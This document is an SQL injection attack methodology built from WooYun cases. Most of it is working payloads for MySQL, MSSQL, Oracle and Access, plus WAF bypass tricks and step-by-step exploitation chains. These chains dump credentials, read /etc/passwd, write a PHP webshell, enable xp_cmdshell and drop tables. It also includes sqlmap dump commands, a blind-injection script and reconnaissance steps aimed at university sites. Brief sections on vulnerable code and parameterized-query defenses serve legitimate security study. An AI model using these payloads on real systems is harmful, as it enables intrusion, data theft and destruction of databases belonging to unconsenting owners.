# SQL Injection Vulnerability Analysis Methodology

> Practical methodology distilled from 27,732 real SQL injection vulnerability cases in WooYun
> Data source: wooyun_vulnerabilities.json (88,636 vulnerabilities total, 27,732 SQL injection)

---

## 1. Methodology Framework

### 1.1 Core Mental Model

```
Missing input validation -> Dynamic SQL concatenation -> Semantic boundary breach -> Database command execution
```

**Key Insight**: The essence of SQL injection is **confusion of the boundary between code and data**. Attackers control input to elevate what should be treated as data into executable SQL commands.

### 1.2 Attack Vector Classification

| Vector Type | Proportion | Typical Scenario |
|------------|-----------|-----------------|
| Login form injection | 66% | Username/password fields directly concatenated |
| Search box injection | 64% | LIKE statement fuzzy matching |
| POST parameter injection | 60% | Form submission data |
| HTTP header injection | 26% | User-Agent/Referer/X-Forwarded-For |
| GET parameter injection | 24% | URL parameter passing |
| Cookie injection | 12% | Session identifier handling |

---

## 2. Injection Point Identification Patterns

### 2.1 High-Risk Parameter Names (Sorted by Frequency)

```python
# High-frequency injection parameters extracted from 27,732 cases
TOP_VULNERABLE_PARAMS = {
    # Numeric ID types (most common)
    'id': 56,           # Resource identifier
    'sort_id': 37,      # Sort field
    'stid': 32,         # Status ID
    'fid': 8,           # Forum/file ID
    'hotelid': 11,      # Business entity ID
    'areainfoid': 8,    # Area information

    # Authentication-related (high risk)
    'username': 33,     # Username
    'password': 30,     # Password
    'userpwd': 11,      # Password variant

    # Business logic parameters
    'type': 18,         # Type selection
    'action': 7,        # Operation type
    'page': 4,          # Pagination parameter
    'name': 30,         # Name search

    # ASP.NET-specific (focus for .NET applications)
    '__viewstate': 58,
    '__eventvalidation': 56,
    '__eventargument': 52,
    '__eventtarget': 41,
}
```

### 2.2 URL Pattern Recognition

**High-risk URL patterns**:
```
# List/detail pages
/news/detail.php?id=1
/product/view.aspx?pid=123
/article.asp?aid=456

# Search functions
/search.php?keyword=test
/list.aspx?stid=5882&pageid=2

# Admin panels
/admin/login.aspx
/manage/user.php?action=edit&uid=1

# API endpoints
/api/getData.php?type=user&id=1
/service/query.aspx?cn=value
```

### 2.3 File Type Risk Assessment

| File Type | Risk Level | Typical Database |
|----------|-----------|-----------------|
| .php | High | MySQL |
| .aspx | High | MSSQL/Oracle |
| .asp | High | Access/MSSQL |
| .jsp | Medium | Oracle/MySQL |
| .do/.action | Medium | Oracle/MySQL |

---

## 3. Database Type Identification Methods

### 3.1 Fingerprinting Techniques

#### MySQL Identification
```sql
-- Version detection
AND @@version LIKE '%MySQL%'
AND version() IS NOT NULL

-- Unique functions
AND sleep(5)
AND benchmark(10000000,sha1('test'))

-- System tables
AND (SELECT 1 FROM information_schema.tables LIMIT 1)

-- Error signatures
"You have an error in your SQL syntax"
"Unknown column"
```

#### MSSQL Identification
```sql
-- Version detection
AND @@version LIKE '%Microsoft%'
AND db_name() IS NOT NULL

-- Unique functions
WAITFOR DELAY '0:0:5'
CONVERT(INT, @@version)

-- System tables
AND (SELECT 1 FROM sysobjects WHERE xtype='U')

-- Error signatures
"Unclosed quotation mark"
"Microsoft OLE DB Provider"
"Incorrect syntax near"
```

#### Oracle Identification
```sql
-- Version detection
AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL

-- Unique syntax
AND 1=1 FROM dual
AND rownum=1

-- Unique functions
CHR(65)||CHR(66)
UTL_HTTP.request('https://example.com/[redacted]')

-- Error signatures
"ORA-00942: table or view does not exist"
"ORA-01756: quoted string not properly terminated"
```

#### Access Identification
```sql
-- Unique syntax
AND (SELECT TOP 1 1 FROM MSysObjects)
AND 1=1--    (does not support # comments)

-- Error signatures
"Microsoft JET Database Engine"
"Syntax error in query expression"
```

### 3.2 Automated Identification Process

```
Step 1: Trigger errors
  Input: ' " ) ; --
  Observe: Error message characteristics

Step 2: Function probing
  MySQL: sleep(2)
  MSSQL: waitfor delay '0:0:2'
  Oracle: dbms_pipe.receive_message('a',2)

Step 3: System table verification
  MySQL: information_schema.tables
  MSSQL: sysobjects
  Oracle: all_tables
  Access: MSysObjects
```

---

## 4. Injection Technique Types and Payloads

### 4.1 Technique Distribution Statistics

| Technique Type | Frequency | Difficulty | Data Extraction Efficiency |
|---------------|----------|-----------|---------------------------|
| Boolean-based blind injection | 50% | Medium | Low |
| Error-based injection | 46% | Low | High |
| Time-based blind injection | 34% | High | Very low |
| Union-based injection | 36% | Low | Very high |
| Stacked queries injection | 20% | Medium | High |
| High-privilege exploitation | 68% | - | - |

### 4.2 Boolean-Based Blind Injection Payloads

```sql
-- Basic boolean
id=1 AND 1=1    -- Normal
id=1 AND 1=2    -- Abnormal

-- String type
id=1' AND '1'='1
id=1' AND '1'='2

-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))

-- Data extraction (character by character)
id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
```

### 4.3 Time-Based Blind Injection Payloads

```sql
-- MySQL
id=1 AND sleep(5)
id=1 AND IF(1=1,sleep(5),0)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))

-- Nested delay (real case)
id=(select(2)from(select(sleep(8)))v)

-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
id=1 IF (1=1) WAITFOR DELAY '0:0:5'

-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

### 4.4 Union-Based Injection Payloads

```sql
-- Column count detection
id=1 ORDER BY 1--
id=1 ORDER BY 2--
...
id=1 ORDER BY N-- (N-1 is the column count when error occurs)

-- Union injection
id=-1 UNION SELECT 1,2,3,4,5--
id=-1 UNION SELECT null,null,null--

-- Data extraction
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

### 4.5 Error-Based Injection Payloads

```sql
-- MySQL extractvalue
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))

-- MySQL updatexml
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
id=1 AND updatexml(1,concat(0x5c,database()),1)

-- MySQL floor error
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
id=1 AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))

-- Real-world case payload
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4329=4329) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'a'='a
```

---

## 5. WAF/Filter Bypass Techniques

### 5.1 Inline Comment Bypass

```sql
-- MySQL version comments (most commonly used)
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3

-- Real case (DeDeCMS bypass)
aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `#@__admin` limit 0,1),5,6,7,8,9#@`\'`
```

### 5.2 Encoding Bypass

```sql
-- Hexadecimal encoding
SELECT * FROM users WHERE name=0x61646d696e    -- 'admin'
CONCAT(0x7e,database(),0x7e)                   -- concat('~',database(),'~')

-- URL encoding
union%20select -> union select
%27 -> '
%23 -> #

-- Double URL encoding
%252f -> /
%2527 -> '

-- Unicode encoding
%u0027 -> '
%u002f -> /
```

### 5.3 Case Obfuscation

```sql
-- Simple obfuscation
UnIoN SeLeCt
uNiOn sElEcT

-- Random case
UNION/**/SELECT
```

### 5.4 Whitespace Substitution

```sql
-- Comment as space replacement
UNION/**/SELECT/**/1,2,3
UNION/*abc*/SELECT

-- Tab/newline
UNION%09SELECT
UNION%0ASELECT
UNION%0DSELECT

-- Parenthesis wrapping
(UNION)(SELECT)
```

### 5.5 Function Substitution

```sql
-- String extraction
SUBSTRING -> MID/SUBSTR/LEFT/RIGHT
-- MySQL
MID(password,1,1)
SUBSTR(password,1,1)

-- Character conversion
CHAR(65) -> A
CHR(65) -> A (Oracle)

-- Concatenation functions
CONCAT -> CONCAT_WS/||
```

### 5.6 Logical Equivalence Substitution

```sql
-- AND/OR replacement
AND 1=1 -> && 1=1 -> & 1
OR 1=1 -> || 1=1 -> | 1

-- Equals sign replacement
id=1 -> id LIKE 1
id=1 -> id BETWEEN 1 AND 1
id=1 -> id IN (1)
id=1 -> id REGEXP '^1$'

-- Quote bypass
'admin' -> CHAR(97,100,109,105,110)
'admin' -> 0x61646d696e
```

---

## 6. Exploitation Chain Construction Methods

### 6.1 Standard Exploitation Process

```
Phase 1: Confirm injection point
  |-- Single quote test: id=1'
  |-- Math operation: id=1-0, id=1*1
  +-- Time delay: id=1 and sleep(3)

Phase 2: Identify database type
  |-- Error message analysis
  +-- Characteristic function probing

Phase 3: Gather database information
  |-- Current database: database()
  |-- Current user: user()
  |-- Version information: version()
  +-- Privilege detection: is_dba

Phase 4: Enumerate database structure
  |-- Database list
  |-- Table name list
  +-- Column name list

Phase 5: Data extraction
  |-- Locate sensitive tables
  +-- Export data

Phase 6: Privilege escalation (optional)
  |-- File read/write
  +-- Command execution
```

### 6.2 MySQL Complete Exploitation Chain

```sql
-- Step 1: Get database information
union select 1,database(),version(),user(),5--

-- Step 2: Get all databases
union select 1,group_concat(schema_name),3 from information_schema.schemata--

-- Step 3: Get all tables in current database
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--

-- Step 4: Get column names for specified table
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--

-- Step 5: Extract data
union select 1,group_concat(username,0x3a,password),3 from users--

-- Step 6: File read (requires FILE privilege)
union select 1,load_file('/etc/passwd'),3--

-- Step 7: Write webshell (requires write privilege)
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

### 6.3 MSSQL Complete Exploitation Chain

```sql
-- Step 1: Get system information
union select 1,@@version,db_name(),system_user,5--

-- Step 2: Get all databases
union select 1,name,3 from master..sysdatabases--

-- Step 3: Get all tables in current database
union select 1,name,3 from sysobjects where xtype='U'--

-- Step 4: Get column names for specified table
union select 1,name,3 from syscolumns where id=object_id('users')--

-- Step 5: Extract data
union select 1,username+':'+password,3 from users--

-- Step 6: Command execution (requires sa privilege)
; exec master..xp_cmdshell 'whoami'--

-- Step 7: Enable xp_cmdshell
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
```

### 6.4 Oracle Complete Exploitation Chain

```sql
-- Step 1: Get system information
union select banner,null from v$version where rownum=1--

-- Step 2: Get current user
union select user,null from dual--

-- Step 3: Get all tables
union select table_name,null from all_tables where rownum<=10--

-- Step 4: Get table structure
union select column_name,null from all_tab_columns where table_name='USERS'--

-- Step 5: Extract data
union select username||':'||password,null from users--
```

---

## 7. Vulnerable Code Patterns

### 7.1 PHP Typical Vulnerable Patterns

```php
// Pattern 1: Direct concatenation (most common)
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";

// Pattern 2: String concatenation
$username = $_POST['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";

// Pattern 3: Insecure filtering
$id = addslashes($_GET['id']);  // Ineffective for numeric injection
$sql = "SELECT * FROM users WHERE id = $id";

// Pattern 4: Wide-byte injection
$name = addslashes($_GET['name']);
// Under GBK encoding, %bf%27 can bypass this
```

### 7.2 ASP/ASP.NET Typical Vulnerable Patterns

```vb
' Classic ASP pattern
id = Request("id")
sql = "SELECT * FROM users WHERE id=" & id

' ASP.NET direct parameter concatenation
string id = Request.QueryString["id"];
string sql = "SELECT * FROM users WHERE id=" + id;
```

### 7.3 Java Typical Vulnerable Patterns

```java
// String concatenation
String id = request.getParameter("id");
String sql = "SELECT * FROM users WHERE id = " + id;
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// MyBatis improper ${} usage
// <select id="getUser">
//     SELECT * FROM users WHERE id = ${id}  <!-- Should use #{id} -->
// </select>
```

### 7.4 Remediation

```python
# Python - Parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# PHP - PDO prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

# Java - PreparedStatement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, id);

# .NET - Parameterized query
cmd.CommandText = "SELECT * FROM users WHERE id = @id";
cmd.Parameters.AddWithValue("@id", id);
```

---

## 8. Case Summaries

### 8.1 High-Risk Case: DBA Privilege Acquisition

**Case ID**: wooyun-2015-0157074

**Target**: A software technology company

**Injection point**: POST parameter `txtuser`

**Technique**: Error-based injection + Boolean-based blind injection

**Payload**:
```sql
txtuser=-7004' OR 6089=6089#
txtuser=-8086' OR 1 GROUP BY CONCAT(0x716b767171,(SELECT (CASE WHEN (5800=5800) THEN 1 ELSE 0 END)),0x7171627171,FLOOR(RAND(0)*2)) HAVING MIN(0)#
```

**Result**: DBA privileges obtained, root password hash and 512 user passwords retrieved

---

### 8.2 Time-Based Blind Injection Case

**Case ID**: wooyun-2015-0114228

**Target**: A network technology company

**Injection point**: GET parameter `hotelid`

**Payload**:
```sql
hotelid=(select(2)from(select(sleep(8)))v)/*'+(select(0)from(select(sleep(0)))v)+'
hotelid=(SELECT (CASE WHEN (8177=8177) THEN SLEEP(10) ELSE 8177*(SELECT 8177 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
```

**Characteristics**: Double-layer SELECT nesting to achieve delay multiplication

---

### 8.3 Inline Comment Bypass Case

**Case ID**: wooyun-2015-0113920

**Target**: A major internet company (DeDeCMS system)

**Bypass technique**: MySQL version comments

**Payload**:
```
/plus/recommend.php?aid=1&_FILES[type][tmp_name]=aa\'and+char(@`\'`)
+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x3C6162633E,
group_concat(0x7C,userid,0x3a,pwd,0x7C),0x3C2F6162633E),5,6,7,8,9
+from+`#@__admin`#"
```

---

### 8.4 MSSQL Command Execution Case

**Case ID**: wooyun-2015-0115882

**Target**: An education exam login system

**Injection point**: POST parameter `PassWord`

**Payload**:
```sql
PassWord=' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4329=4329) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'a'='a
```

**Characteristics**: CHAR function bypasses character filtering, CONVERT error-based injection

---

## 9. Testing Process Checklist

### 9.1 Quick Detection Process

```markdown
[ ] 1. Single quote test: Input ' and observe response
[ ] 2. Double quote test: Input " and observe response
[ ] 3. Comment test: Input --, #, /**/ and observe response
[ ] 4. Math operation: Input 1-0, 1*1 and observe response
[ ] 5. Boolean test: and 1=1 / and 1=2 comparison
[ ] 6. Time delay: and sleep(5) observe response time
[ ] 7. Order test: order by N incremental testing
```

### 9.2 SQLMap Common Parameters

```bash
# Basic detection
sqlmap -u "http://target/page.php?id=1" --batch

# POST request
sqlmap -u "http://target/login.php" --data="username=test&password=test" --batch

# Cookie injection
sqlmap -u "http://target/page.php" --cookie="id=1" --level=2 --batch

# HTTP header injection
sqlmap -u "http://target/page.php" --headers="X-Forwarded-For: 1" --level=3 --batch

# Time-based blind injection optimization
sqlmap -u "http://target/page.php?id=1" --technique=T --time-sec=2 --batch

# WAF bypass
sqlmap -u "http://target/page.php?id=1" --tamper=space2comment,between --batch

# Data extraction
sqlmap -u "http://target/page.php?id=1" --dbs --batch
sqlmap -u "http://target/page.php?id=1" -D database --tables --batch
sqlmap -u "http://target/page.php?id=1" -D database -T table --columns --batch
sqlmap -u "http://target/page.php?id=1" -D database -T table -C col1,col2 --dump --batch
```

---

## 10. Defense Recommendations

### 10.1 Code-Level Defenses

1. **Parameterized queries** (preferred)
2. **Stored procedures** (secondary)
3. **Input validation** (allowlist validation)
4. **Principle of least privilege** (database accounts)

### 10.2 Architecture-Level Defenses

1. **WAF deployment**
2. **Database auditing**
3. **Error message suppression**
4. **Network isolation**

---

## Appendix: Data Statistics

### A. Annual Trends

| Year | Count | Proportion |
|-----|------|------|
| 2010 | 158 | 0.6% |
| 2011 | 320 | 1.2% |
| 2012 | 1,115 | 4.0% |
| 2013 | 3,058 | 11.0% |
| 2014 | 7,375 | 26.6% |
| 2015 | 13,802 | 49.8% |
| 2016 | 1,904 | 6.9% |

### B. Industry Distribution

| Industry | Count | Proportion |
|---------|------|------|
| Internet/Other | 23,679 | 85.4% |
| Education | 2,751 | 9.9% |
| Finance | 461 | 1.7% |
| Government | 422 | 1.5% |
| E-commerce | 243 | 0.9% |

### C. Database Distribution (Top 50 Detailed Cases)

| Database | Count |
|---------|------|
| MySQL | 23 |
| Access | 17 |
| MSSQL | 14 |
| Oracle | 10 |
| PostgreSQL | 2 |

---

## Case Analysis #1: Access Database Boolean-Based Blind Injection in Practice

### Knowledge Source
- **Case**: wooyun-2015-0107553
- **Title**: SQL injection in a courseware management system
- **Vendor**: A software development company
- **Impact**: Courseware management system used by numerous universities

### Meta-Analysis

**Core Problem Identification**:
- Access databases lack system metadata tables (no information_schema equivalent)
- Automated tools like SQLMap fail when unable to enumerate table names
- Attackers need to complete the exploitation chain through **source code leaks** or **table name guessing**

**Developer False Assumptions**:
1. "Access databases are more secure than MySQL/MSSQL because they lack powerful features"
2. "Using a non-standard database reduces automated attack risk"
3. "Numeric ID parameters are safe and do not need filtering"

**Root Cause Analysis**:
- **Security paradox**: Access's "simplicity" increases attack cost but does not eliminate risk
- **Information asymmetry**: Attackers obtain table structure information by downloading official source code, breaking the "security through obscurity" that defenders rely on
- **Defense blind spot**: Defenders may overlook the risk of physical source code leaks (source code available for download from official website)

### Analytical Logic

**Attack Path Analysis**:
```
1. Injection point discovery -> 2. Database type identification -> 3. Automated tool failure -> 4. Source code acquisition strategy -> 5. Table name enumeration -> 6. Manual blind injection
```

**Key Trigger Points**:
- **Parameter type**: GET parameter `id` (numeric)
- **Injection type**: Boolean-based blind injection
- **Injection location**: WHERE/HAVING clause
- **Database characteristics**: Microsoft Access (Windows 2003/XP + IIS 6.0 + ASP.NET 2.0.50727)

**Boundary Conditions**:
- Must be a numeric injection point (string type requires quote closure)
- Application must have differential data response (True/False return different content)
- Must know exact table and column names

**Related Factors**:
- Target system's official website provides source code download
- User table naming convention: `C_User` (C prefix may be Class/Company abbreviation)
- Numerous universities use the same system (batch exploitation potential)

### Testing Process

```markdown
Step 1: Injection point probing
  +-- Input: action=update&id=8 AND 1=1
     |-- True: Page returns normally
     +-- Input: action=update&id=8 AND 1=2
        +-- False: Page abnormal/missing data

Step 2: Database type identification (SQLMap automated)
  |-- Exclude MySQL: sleep() ineffective
  |-- Exclude Oracle: rownum syntax ineffective
  |-- Exclude MSSQL: @@version ineffective
  |-- Exclude SQLite: specific system tables ineffective
  +-- Confirm Access: (SELECT TOP 1 1 FROM MSysObjects) effective

Step 3: Automated tool attempt (SQLMap)
  |-- Access dictionary brute-force table names: Failed (Access has no information_schema)
  |-- Try common table name dictionary: Failed
  +-- Blocking point: Lack of table name metadata

Step 4: Source code acquisition strategy
  |-- Visit official website
  |-- Download complete system source code
  +-- Analyze database design files/code

Step 5: Table name extraction
  |-- Locate user-related code modules
  |-- Find database table definitions
  +-- Confirm user table: C_User

Step 6: Manual boolean-based blind injection
  +-- Construct character-by-character extraction payloads
```

### Exploitation Methods

**Basic Boolean-Based Blind Injection Payload**:
```sql
-- Numeric injection (no quote closure needed)
action=update&id=8 AND 5342=5342  -- True
action=update&id=8 AND 5342=5343  -- False
```

**Access Data Extraction Payloads** (manually constructed):
```sql
-- Character-by-character username extraction (assuming 1st character)
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) > 97

-- Complete blind injection process
-- 1. Determine username length
action=update&id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5

-- 2. Character-by-character guessing
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97  -- 'a'
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 98  -- 'b'

-- 3. Password hash extraction
action=update&id=8 AND ASCII((SELECT TOP 1 MID(password,1,1) FROM C_User WHERE username='admin')) > 48

-- 4. Multi-user enumeration (using NOT IN)
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

**Time-Based Blind Injection Alternative** (Access does not support SLEEP):
```sql
-- Access brute-force count delay (inefficient but viable)
action=update&id=8 AND (SELECT COUNT(*) FROM C_User AS T1, C_User AS T2, C_User AS T3, C_User AS T4, C_User AS T5, C_User AS T6, C_User AS T7, C_User AS T8, C_User AS T9, C_User AS T10) > 0
-- Cartesian product delay, record count grows exponentially
```

### Bypass Techniques

| Bypass Type | Specific Technique | Applicable Scenario |
|------------|-------------------|-------------------|
| **Table name enumeration limitation** | Download source code from official site -> static analysis for table structure | Open-source/commercial systems where vendor provides source code download |
| **Automated tool failure** | Switch from SQLMap to manual blind injection scripts | Databases without metadata tables like Access |
| **Database type identification** | SQLMap tests database fingerprints one by one | When database type is unknown |
| **Batch exploitation** | Table name reuse patterns (e.g., C_User prefix) | Same vendor multi-site deployments |

**Access Database Unique Limitations**:
```sql
-- 1. Unsupported features
-- UNION SELECT (some Access versions)
-- Limited subquery nesting depth
-- No SLEEP/WAITFOR delay functions
-- No information_schema system tables
-- Comment only supports -- (not #)

-- 2. Unique syntax (exploitable)
-- TOP clause: SELECT TOP 1 * FROM table
-- MID function: MID(string, start, length)
-- ASC function: ASC('A') = 65
-- IIF function: IIF(condition, true_value, false_value)
-- DISTINCTROW for deduplication
```

**Manual Blind Injection Script Optimization Strategies**:
```python
# Efficiency optimization strategies
class AccessBlindInjector:
    """
    Core insights:
    1. Binary search for character guessing (50% fewer requests)
    2. Concurrent multi-character extraction (async IO)
    3. Cache table/column name mappings (reuse)
    4. Adaptive delay adjustment (avoid triggering alerts)
    """

    def binary_search_char(self, query_template, position):
        """Use binary search to guess a single character"""
        # ASCII 32-126 range -> max 7 requests (vs 94 linear)
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if self.test_payload(query_template.format(pos=position, val=mid)):
                low = mid + 1
            else:
                high = mid - 1
        return chr(high)

    def batch_extract_users(self):
        """Batch extract user data"""
        # First get all user IDs
        # Then concurrently extract usernames/passwords
        # Finally combine data locally
        pass
```

### Root Cause Analysis

**Systematic Thinking**:

1. **Multiple paths for information acquisition**
   - Automated tool failure -> Manual analysis
   - Blind injection without table names -> Source code acquisition
   - Source code unavailable -> Name guessing (admin/user/member/login, etc.)
   - Name guessing failure -> Social engineering (technical docs/error messages/old database leaks)

2. **"Implicit weaknesses" of Access databases**
   - Design intent: Desktop-grade lightweight database
   - Reality: Used in web environments but lacking enterprise security features
   - Defense blind spot: Developers assume "niche database = more secure"
   - Attack cost: Indeed higher, but not insurmountable

3. **"Knowledge asymmetry" in vulnerability exploitation**
   - Defender reliance: Security through obscurity
   - Attacker advantage: Downloadable source code -> Transparent table structure
   - Escalation: Table name obfuscation vs decompilation/dynamic debugging

4. **"Scale effect" of batch exploitation**
   - Single-site exploitation cost: High (requires source code analysis)
   - Batch exploitation cost: Low (one analysis, reuse across multiple sites)
   - ROI calculation: More universities affected -> Higher attack value

### Defense Recommendations

**Developer level**:
1. Remove publicly available source code downloads from official website (or use demo database)
2. Force type casting for all numeric ID parameters: `int($_GET['id'])`
3. Rename sensitive tables (`C_User` -> random hash)
4. Restrict database file physical path access (.mdb should not be in web directory)

**Architecture level**:
1. Migrate to enterprise-grade databases (MySQL/MSSQL/PostgreSQL)
2. Enable IIS file access controls (prevent .mdb downloads)
3. Deploy WAF (detect boolean-based blind injection characteristics: AND/OR + math operations)
4. Database auditing (monitor anomalous query patterns)

### Extended Attack Surface

**From single table to multiple tables**:
```sql
-- 1. Enumerate all tables (based on naming conventions)
SELECT * FROM C_Admin    -- Administrators
SELECT * FROM C_User     -- Users
SELECT * FROM C_Teacher  -- Teachers
SELECT * FROM C_Student  -- Students
SELECT * FROM C_Course   -- Courses

-- 2. Using system tables (requires privileges)
SELECT name FROM MSysObjects WHERE type=1 AND flags=0
-- Returns all user table names (but default permissions insufficient)
```

**From Access to system privileges**:
```
Access injection -> File upload vulnerability -> WebShell
               |
           .mdb download -> Local cracking -> Admin password
               |
           Batch university sites -> Education network lateral movement
```

---

## Case Analysis #2: Education Website Sub-Site SQL Injection Pattern

### Knowledge Source
- **Case**: wooyun-2015-0137200
- **Title**: SQL injection in a sub-site of an organization
- **Vendor**: A major university
- **Impact**: Educational institution sub-site systems

### Meta-Analysis

**Core Problem Identification**:
- University website architecture exhibits a **main site + sub-site** distributed management model
- Sub-sites are typically developed independently by different departments or outsourced, with varying security levels
- **Trust inheritance of sub-site domains**: Users trust `subdomain.university.edu` equally as the main site
- Education websites generally have a **function over security** development culture

**Developer False Assumptions**:
1. "Sub-site traffic is low and gets little attention, attackers won't find it"
2. "Using the unified university domain equals sharing the main site's security protections"
3. "Simple parameter filtering (like addslashes) is sufficient to prevent SQL injection"
4. "The educational intranet environment is relatively safe, external attacks are hard to reach"

**Root Cause Analysis**:
- **Weakest link theory**: Overall security level is determined by the most vulnerable sub-site (barrel effect)
- **Trust transfer risk**: Main site's reputation is leveraged by sub-sites; users cannot distinguish security boundaries between main and sub-sites
- **Resource allocation mismatch**: Security budget concentrates on the main site; sub-sites become "forgotten corners"
- **Education sector specificity**: Conflict between open access requirements and high-value data (student/faculty information, research)

### Analytical Logic

**Attack Path Analysis**:
```
1. Sub-site enumeration -> 2. Fingerprinting -> 3. Parameter discovery -> 4. Injection testing -> 5. Privilege escalation -> 6. Intranet lateral movement
```

**Key Trigger Points**:
- **Sub-site characteristics**: Third-level domains (e.g., `xxx.university.edu`), second-level directories (e.g., `university.edu/xxx`)
- **Parameter patterns**: Simple ID parameters (`id=1`), unfiltered user input
- **Technology stack characteristics**: PHP/ASP + MySQL/Access, outdated CMS systems
- **Defense gaps**: No WAF, no input filtering, error messages returned directly

**Boundary Conditions**:
- Sub-site independently deployed (not integrated with main site unified authentication)
- Using open-source/commercial CMS without timely patching
- Overly permissive database connection privileges (can read other databases)
- Sub-site shares database server or intranet connectivity with main site

**Related Factors**:
- Education network IP ranges can be identified by scanners
- Sub-sites often developed by students/outsourced teams lacking security awareness
- Source code may be publicly available on GitHub/GitLab (university open-source culture)
- Multiple sub-sites use the same system (batch exploitation potential)

### Testing Process

```markdown
Step 1: Sub-site enumeration (Information gathering)
  |-- Method 1: Search engine syntax
  |   +-- site:university.edu -www
  |-- Method 2: Certificate transparency logs (crt.sh)
  |   +-- Query all subdomains for *.university.edu
  |-- Method 3: DNS zone transfer vulnerability
  |   +-- axfr @dns.university.edu university.edu
  +-- Method 4: Subdomain brute-force tools
      +-- sublist3r -d university.edu

Step 2: Technology stack identification
  |-- HTTP response headers: X-Powered-By: PHP/5.3.29
  |-- File extensions: .php / .asp / .aspx
  |-- Directory scanning: /admin/ /backup/ /uploads/
  |-- CMS fingerprinting: Wappalyzer / WhatWeb
  +-- Error pages: Leak absolute paths / database versions

Step 3: Parameter discovery
  |-- Crawler: Spider captures all links
  |-- Common parameters: id, pid, aid, uid, cat, type, page
  |-- Test input: 1, 1', 1", 1 and 1=1
  +-- Observe response: Error messages / page differences / response time

Step 4: Injection point validation
  |-- Boolean test: id=1 and 1=1 (normal) / id=1 and 1=2 (abnormal)
  |-- Error test: id=1' (triggers SQL syntax error)
  |-- Union test: id=1 union select 1,2,3--
  +-- Time test: id=1 and sleep(5)--

Step 5: Database fingerprinting
  |-- MySQL: version(), sleep(), information_schema
  |-- MSSQL: @@version, waitfor delay, sysobjects
  |-- Access: MSysObjects, does not support # comments
  +-- PostgreSQL: version(), pg_sleep

Step 6: Data extraction
  |-- Enumerate databases: schema_name / db_name()
  |-- Enumerate table names: table_name / name
  |-- Enumerate column names: column_name / system table queries
  +-- Export sensitive data: user tables / admin tables / student information
```

### Exploitation Methods

**Basic Injection Payloads** (simple patterns from the case):
```sql
-- Single quote test (string-type injection)
id=1' AND 1=1--

-- Numeric injection
id=1 AND 1=1--
id=1 AND 1=2--

-- Stacked queries (some databases support this)
id=1; DROP TABLE users--

-- Bypassing simple filters (comment characters)
id=1' /*!00000AND*/ 1=1--
```

**Common Sensitive Tables in Education Websites** (based on WooYun statistics):
```sql
-- Student information tables
SELECT * FROM student
SELECT * FROM student_info

-- Faculty information tables
SELECT * FROM teacher
SELECT * FROM faculty

-- Administrator tables
SELECT * FROM admin
SELECT * FROM administrator
SELECT * FROM users WHERE role='admin'

-- Grade tables
SELECT * FROM score

-- Course tables
SELECT * FROM course
```

### Bypass Techniques

| Scenario | Bypass Method | Description |
|---------|-------------|------|
| **Simple filtering** | `id=1' OR '1'='1` | Close quotes and construct tautology |
| **addslashes()** | Wide-byte injection: `%bf%27` | Multi-byte character bypass under GBK encoding |
| **Space filtering** | `/**/`, `%09`, `/**/union/**/select` | Comment/Tab as space replacement |
| **AND/OR filtering** | `&&`, `\|\|`, `%26%26`, `%7C%7C` | Symbol substitution |
| **UNION filtering** | `/*!00000union*/`, `UnIoN` | Inline comment/case obfuscation |
| **SELECT filtering** | `/*!00000select*/`, `SeLeCt` | Inline comment/case obfuscation |
